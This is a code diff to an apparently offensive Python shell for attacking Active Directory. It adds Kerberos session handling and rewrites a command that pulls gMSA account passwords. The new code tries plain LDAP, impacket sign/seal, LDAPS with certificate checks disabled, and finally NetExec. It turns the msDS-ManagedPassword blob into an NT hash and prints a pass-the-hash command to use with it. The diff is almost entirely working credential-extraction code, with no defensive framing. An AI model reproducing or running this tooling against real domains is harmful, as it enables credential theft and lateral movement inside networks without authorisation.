@@ -154,7 +154,7 @@ def connect(initial_command=None):
                 print(f"[*] Connecting to {dc_hostname} via Kerberos...")
                 server = Server(dc_hostname, get_info=ALL)
                 conn = Connection(server, authentication=SASL, sasl_mechanism=KERBEROS, auto_bind=True)
-                profile = {"ip": dc_ip, "username": username, "password": password, "conn":conn, "base_dn":base_dn, "connected_at": time.time(), "domain": domain, "ldaps":False}
+                profile = {"ip": dc_ip, "username": username, "password": password, "conn":conn, "base_dn":base_dn, "connected_at": time.time(), "domain": domain, "ldaps":False, "kerberos": True, "ccache": ccache_file}
                 if sessions.size() >= MAX_SESSIONS:
                     removed = sessions.items.pop(0)
                     print(f"[bold red][!] Session limit reached. Removing oldest session ({removed['username']}@{removed['ip']})[/bold red]")
@@ -286,6 +286,9 @@ def connect(initial_command=None):
             try:
                 sessionid = int(command[1])
                 current_session = sessions.items[sessionid]
+                # Kerberos sessions must point KRB5CCNAME back at their own ccache
+                if current_session.get("kerberos") and current_session.get("ccache"):
+                    os.environ["KRB5CCNAME"] = current_session["ccache"]
                 print(f"Using session {sessionid} ({current_session['username']} @ {current_session['ip']})")
             except:
                 print("Invalid ID")
@@ -354,7 +357,7 @@ def connect(initial_command=None):
             args.dc_fqdn = None
             args.hash = current_session.get("nthash")
             args.ldaps = current_session.get("ldaps", False)
-            args.kerberos = bool(os.environ.get("KRB5CCNAME"))
+            args.kerberos = current_session.get("kerberos", False)
 
             try:
                 from aclftw import aclftw
@@ -499,55 +502,146 @@ def connect(initial_command=None):
                 target_gmsa += '$'
 
             try:
-                # First try native ldap3 query in case Kerberos or LDAPS is used
-                conn = current_session["conn"]
-                base_dn = current_session["base_dn"]
-                success = False
-                
-                try:
-                    conn.search(base_dn, f"(sAMAccountName={target_gmsa})", attributes=['msDS-ManagedPassword'])
-                    if conn.entries and "msDS-ManagedPassword" in conn.entries[0] and conn.entries[0]["msDS-ManagedPassword"].raw_values:
-                        password_blob = conn.entries[0]["msDS-ManagedPassword"].raw_values[0]
-                        import struct
-                        import hashlib
-                        version, reserved, length, cur_off, prev_off, query_off, unch_off = struct.unpack('<HHLHHHH', password_blob[:16])
-                        offsets = [o for o in [prev_off, query_off, unch_off] if o > cur_off]
-                        end_off = min(offsets) if offsets else len(password_blob)
-                        pwd_bytes = password_blob[cur_off:end_off]
-                        if len(pwd_bytes) >= 2: pwd_bytes = pwd_bytes[:-2]
-                        nt_hash = hashlib.new('md4', pwd_bytes).hexdigest()
-                        print(f"\n[bold green][+] Successfully extracted GMSA password for {target_gmsa}[/bold green]")
-                        print(f"[bold cyan]NT Hash: {nt_hash}[/bold cyan]")
-                        success = True
-                except Exception as e:
-                    pass
-                
-                if success:
-                    continue
-                
-                # If native ldap3 fails (e.g. UNABLE_TO_PROCEED over port 389 NTLM), use NXC as robust fallback
+                import struct
+                import hashlib
                 import subprocess
                 import re
-                print(f"[*] Native LDAP3 retrieval failed or blocked. Attempting fallback via NXC NTLM sign/seal...")
-                
-                cmd = ['nxc', 'ldap', current_session["ip"], '-u', current_session['username']]
-                if current_session.get("nthash"):
-                    cmd.extend(['-H', current_session["nthash"]])
-                else:
-                    cmd.extend(['-p', current_session["password"]])
-                cmd.append('--gmsa')
-                
-                out = subprocess.check_output(cmd, text=True, stderr=subprocess.STDOUT)
-                
-                # Parse NXC output for Account: TARGET_GMSA$ NTLM: hash
-                match = re.search(rf"Account:\s*{re.escape(target_gmsa)}\s+NTLM:\s*([a-fA-F0-9]{{32}})", out, re.IGNORECASE)
-                if match:
+
+                def parse_managed_password(blob):
+                    """Parse MS-GGEDP msDS-ManagedPassword blob -> current password NT hash"""
+                    version, reserved, length, cur_off, prev_off, query_off, unch_off = struct.unpack('<HHLHHHH', blob[:16])
+                    offsets = [o for o in [prev_off, query_off, unch_off] if o > cur_off]
+                    end_off = min(offsets) if offsets else len(blob)
+                    pwd_bytes = blob[cur_off:end_off]
+                    if len(pwd_bytes) >= 2:
+                        pwd_bytes = pwd_bytes[:-2]  # strip null terminator
+                    return hashlib.new('md4', pwd_bytes).hexdigest()
+
+                def read_managed_password(conn_obj, base_dn_obj):
+                    try:
+                        conn_obj.search(base_dn_obj, f"(sAMAccountName={target_gmsa})", attributes=['msDS-ManagedPassword'])
+                        if conn_obj.entries and 'msDS-ManagedPassword' in conn_obj.entries[0] and conn_obj.entries[0]['msDS-ManagedPassword'].raw_values:
+                            return parse_managed_password(conn_obj.entries[0]['msDS-ManagedPassword'].raw_values[0])
+                    except Exception as e:
+                        print(f"[*] LDAP read of msDS-ManagedPassword failed: {e}")
+                    return None
+
+                def report_success(nt_hash):
                     print(f"\n[bold green][+] Successfully extracted GMSA password for {target_gmsa}[/bold green]")
-                    print(f"[bold cyan]NT Hash: {match.group(1)}[/bold cyan]")
+                    print(f"[bold cyan]NT Hash: {nt_hash}[/bold cyan]")
+                    target_fqdn = f"{target_gmsa[:-1].lower()}.{current_session['domain']}"
+                    print(f"[*] Use it: nxc smb {target_fqdn} -u '{target_gmsa}' -H '{nt_hash}'")
+
+                base_dn = current_session["base_dn"]
+                kerberos = current_session.get("kerberos", False)
+
+                def get_dc_fqdn(session):
+                    try:
+                        val = session["conn"].server.info.other.get('dnsHostName')
+                        if val:
+                            # ldap3 returns a list here, but a str after some binds
+                            return str(val[0]) if isinstance(val, (list, tuple)) else str(val)
+                    except Exception:
+                        pass
+                    return None
+
+                nt_hash = None
+
+                # 1) Existing session connection (works when it is LDAPS or otherwise sealed)
+                nt_hash = read_managed_password(current_session["conn"], base_dn)
+
+                # 2) Impacket LDAP with sign/seal. AD requires a signed/sealed channel for
+                #    msDS-ManagedPassword and ldap3 on Linux cannot do NTLM/Kerberos
+                #    session security, so this is the reliable native path.
+                if not nt_hash:
+                    print("[*] Plain LDAP blocked msDS-ManagedPassword. Retrying via impacket LDAP sign/seal...")
+                    dc_fqdn = get_dc_fqdn(current_session)
+                    try:
+                        from impacket.ldap import ldap as imp_ldap
+                        # Kerberos SPN needs the DC hostname in the URL (ldap/<host>),
+                        # dstIp connects to the IP directly
+                        url_host = dc_fqdn if (kerberos and dc_fqdn) else current_session["ip"]
+                        lconn = imp_ldap.LDAPConnection(url=f'ldap://{url_host}', dstIp=current_session["ip"])
+                        if kerberos:
+                            lconn.kerberosLogin(current_session['username'], '', current_session['domain'], '', '', '', kdcHost=dc_fqdn or current_session["ip"], useCache=True)
+                        elif current_session.get("nthash"):
+                            lconn.login(current_session['username'], '', current_session['domain'], 'aad3b435b51404eeaad3b435b51404ee', current_session["nthash"])
+                        else:
+                            lconn.login(current_session['username'], current_session['password'], current_session['domain'], '', '')
+                        resp = lconn.search(base_dn, searchFilter=f"(sAMAccountName={target_gmsa})", attributes=['msDS-ManagedPassword'])
+                        if resp:
+                            raw_attr = resp[0]['attributes'][0]
+                            try:
+                                vals = raw_attr['vals']
+                            except Exception:
+                                vals = [raw_attr['val']]
+                            nt_hash = parse_managed_password(bytes(vals[0]))
+                    except Exception as e:
+                        print(f"[*] Impacket retrieval failed: {e}")
+
+                # 3) Fresh LDAPS (636) connection: TLS satisfies the secure-channel
+                #    requirement, so no NTLM sign/seal (which ldap3 cannot do) is needed.
+                if not nt_hash:
+                    print("[*] Impacket retrieval failed. Retrying over LDAPS (636)...")
+                    netbios = infer_netbios(current_session["domain"])
+                    try:
+                        tls = Tls(validate=ssl.CERT_NONE)
+                        srv = Server(current_session["ip"], port=636, use_ssl=True, get_info=ALL, tls=tls)
+                        if kerberos:
+                            ldaps_conn = Connection(srv, authentication=SASL, sasl_mechanism=KERBEROS, auto_bind=True)
+                        elif current_session.get("nthash"):
+                            ldaps_conn = Connection(srv, user=f"{netbios}\\{current_session['username']}", password=f"aad3b435b51404eeaad3b435b51404ee:{current_session['nthash']}", authentication=NTLM, auto_bind=True)
+                        else:
+                            ldaps_conn = Connection(srv, user=f"{netbios}\\{current_session['username']}", password=current_session["password"], authentication=NTLM, auto_bind=True)
+                        nt_hash = read_managed_password(ldaps_conn, base_dn)
+                        ldaps_conn.unbind()
+                    except Exception as e:
+                        print(f"[*] LDAPS fallback failed: {e}")
+
+                if nt_hash:
+                    report_success(nt_hash)
+                    continue
+
+                # 4) Last resort: NXC / NetExec (it handles LDAP signing/sealing itself)
+                print(f"[*] Native LDAP3 retrieval failed or blocked. Attempting fallback via NXC NTLM sign/seal...")
+                # Kerberos needs the DC hostname for SPN matching
+                host = current_session["ip"]
+                if kerberos:
+                    host = get_dc_fqdn(current_session) or current_session["ip"]
+
+                out = None
+                for tool in ('nxc', 'netexec'):
+                    try:
+                        cmd = [tool, 'ldap', host, '-u', current_session['username'], '-d', current_session['domain']]
+                        if current_session.get("nthash"):
+                            cmd.extend(['-H', current_session["nthash"]])
+                        else:
+                            cmd.extend(['-p', current_session["password"]])
+                        if kerberos:
+                            cmd.append('-k')
+                        cmd.append('--gmsa')
+                        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
+                        out = (proc.stdout or '') + (proc.stderr or '')
+                        match = re.search(rf"Account:\s*{re.escape(target_gmsa)}\s+NTLM:\s*([a-fA-F0-9]{{32}})", out, re.IGNORECASE)
+                        if match:
+                            nt_hash = match.group(1).lower()
+                            break
+                    except FileNotFoundError:
+                        continue
+                    except subprocess.TimeoutExpired:
+                        out = "[!] nxc timed out"
+                        continue
+
+                if nt_hash:
+                    report_success(nt_hash)
                 else:
                     print(f"[-] Could not extract GMSA password via fallback.")
                     print(f"[-] Ensure {target_gmsa} exists and you have 'ReadGmsaPassword' rights.")
-                
+                    if out:
+                        print(f"[*] Tool output (last 10 lines):")
+                        for line in out.strip().splitlines()[-10:]:
+                            print(f"    {line}")
+
             except Exception as e:
                 print(f"[-] Error retrieving GMSA Password: {e}")
 
